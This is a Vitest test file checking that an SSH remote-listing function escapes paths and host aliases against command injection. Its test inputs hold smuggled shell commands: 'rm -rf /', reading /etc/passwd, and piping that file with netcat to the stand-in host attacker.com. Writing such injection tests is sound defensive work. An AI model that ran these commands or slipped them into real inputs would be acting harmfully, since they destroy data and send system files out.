import { describe, it, expect, vi, beforeEach } from "vitest";
import { SSHHostConfig } from "../types/server";
import { executeRemoteLs } from "./ssh";
import { exec } from "child_process";

// Mock the exec function to capture commands
vi.mock("child_process", () => {
  const actual = vi.importActual("child_process");
  return {
    ...actual,
    exec: vi.fn(),
  };
});

describe("SSH Remote Listing", () => {
  const mockHostConfig: SSHHostConfig = {
    host: "testserver",
    hostName: "example.com",
    user: "testuser",
    port: 22,
  };

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe("executeRemoteLs - Command Injection Prevention", () => {
    it("should escape remotePath to prevent command injection", async () => {
      const maliciousPath = "/tmp/test; rm -rf /";

      // Mock exec to capture the command
      let capturedCommand = "";
      (exec as any).mockImplementation(
        (command: string, options: any, callback: any) => {
          capturedCommand = command;
          // Return success
          callback(null, { stdout: "total 0\n", stderr: "" });
        },
      );

      await executeRemoteLs(mockHostConfig, maliciousPath);

      // The malicious path should be escaped and passed as $1 to the wrapper (no execution)
      expect(capturedCommand).toMatch(/\/tmp\/test; rm -rf \//);
      // Wrapper script receives path as single argument; path must be in quotes
      expect(capturedCommand).toMatch(/sh -c .* _ /);
      expect(capturedCommand).toMatch(/'\/tmp\/test; rm -rf \/'/);
    });

    it("should escape remotePath with pipe to prevent injection", async () => {
      const maliciousPath = "/tmp/test | cat /etc/passwd";

      let capturedCommand = "";
      (exec as any).mockImplementation(
        (command: string, options: any, callback: any) => {
          capturedCommand = command;
          callback(null, { stdout: "total 0\n", stderr: "" });
        },
      );

      await executeRemoteLs(mockHostConfig, maliciousPath);

      // The path should be escaped and passed as $1 to the wrapper
      expect(capturedCommand).toMatch(/\/tmp\/test \| cat \/etc\/passwd/);
      expect(capturedCommand).toMatch(/sh -c .* _ /);
      expect(capturedCommand).toMatch(/'\/tmp\/test \| cat \/etc\/passwd'/);
    });

    it("should escape hostAlias to prevent command injection", async () => {
      const maliciousHostConfig: SSHHostConfig = {
        host: "server; rm -rf /",
        hostName: "example.com",
      };

      let capturedCommand = "";
      (exec as any).mockImplementation(
        (command: string, options: any, callback: any) => {
          capturedCommand = command;
          callback(null, { stdout: "total 0\n", stderr: "" });
        },
      );

      await executeRemoteLs(maliciousHostConfig, "/remote/path");

      // The malicious host alias should be escaped
      expect(capturedCommand).toContain("'server; rm -rf /'");
    });

    it("should handle paths with spaces", async () => {
      const pathWithSpaces = "/remote/path with spaces";

      let capturedCommand = "";
      (exec as any).mockImplementation(
        (command: string, options: any, callback: any) => {
          capturedCommand = command;
          callback(null, { stdout: "total 0\n", stderr: "" });
        },
      );

      await executeRemoteLs(mockHostConfig, pathWithSpaces);

      // Paths with spaces should be passed as single argument to wrapper
      expect(capturedCommand).toMatch(/\/remote\/path with spaces/);
      expect(capturedCommand).toMatch(/sh -c .* _ /);
      expect(capturedCommand).toMatch(/'\/remote\/path with spaces'/);
    });

    it("should handle paths with single quotes", async () => {
      const pathWithQuotes = "/remote/file'name.txt";

      let capturedCommand = "";
      (exec as any).mockImplementation(
        (command: string, options: any, callback: any) => {
          capturedCommand = command;
          callback(null, { stdout: "total 0\n", stderr: "" });
        },
      );

      await executeRemoteLs(mockHostConfig, pathWithQuotes);

      // Paths with single quotes should be properly escaped
      // The path is escaped (single quotes become '\'') and then the entire remote command is escaped
      // So we check that the escaped path appears in the command
      expect(capturedCommand).toMatch(/\/remote\/file.*name\.txt/);
      // The escaping for single quotes in the path should be present
      expect(capturedCommand).toMatch(/file.*\\''.*name/);
    });

    it("should escape complex injection attempts", async () => {
      const complexInjection =
        "/tmp/test; cat /etc/passwd | nc attacker.com 1234";

      let capturedCommand = "";
      (exec as any).mockImplementation(
        (command: string, options: any, callback: any) => {
          capturedCommand = command;
          callback(null, { stdout: "total 0\n", stderr: "" });
        },
      );

      await executeRemoteLs(mockHostConfig, complexInjection);

      // The entire malicious string should be escaped as single argument to wrapper
      expect(capturedCommand).toMatch(
        /\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234/,
      );
      expect(capturedCommand).toMatch(/sh -c .* _ /);
      expect(capturedCommand).toMatch(
        /'\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234'/,
      );
    });

    it("should allow tilde expansion for paths starting with ~/", async () => {
      const tildePath = "~/Desktop/subdir";

      let capturedCommand = "";
      (exec as any).mockImplementation(
        (command: string, options: any, callback: any) => {
          capturedCommand = command;
          callback(null, { stdout: "total 0\n", stderr: "" });
        },
      );

      await executeRemoteLs(mockHostConfig, tildePath);

      // Path is fully escaped and passed as $1; wrapper expands ~ on the remote
      expect(capturedCommand).toMatch(/~/);
      expect(capturedCommand).toMatch(/Desktop\/subdir/);
      expect(capturedCommand).toMatch(/sh -c .* _ /);
      expect(capturedCommand).toMatch(/Desktop\/subdir/);
    });

    it("should handle standalone tilde", async () => {
      const tildePath = "~";

      let capturedCommand = "";
      (exec as any).mockImplementation(
        (command: string, options: any, callback: any) => {
          capturedCommand = command;
          callback(null, { stdout: "total 0\n", stderr: "" });
        },
      );

      await executeRemoteLs(mockHostConfig, tildePath);

      // Path ~ is escaped and passed as $1; wrapper expands it to $HOME on remote
      expect(capturedCommand).toMatch(/sh -c .* _ /);
      // ~ is passed as the path argument (escaped)
      expect(capturedCommand).toMatch(/~/);
    });
  });
});
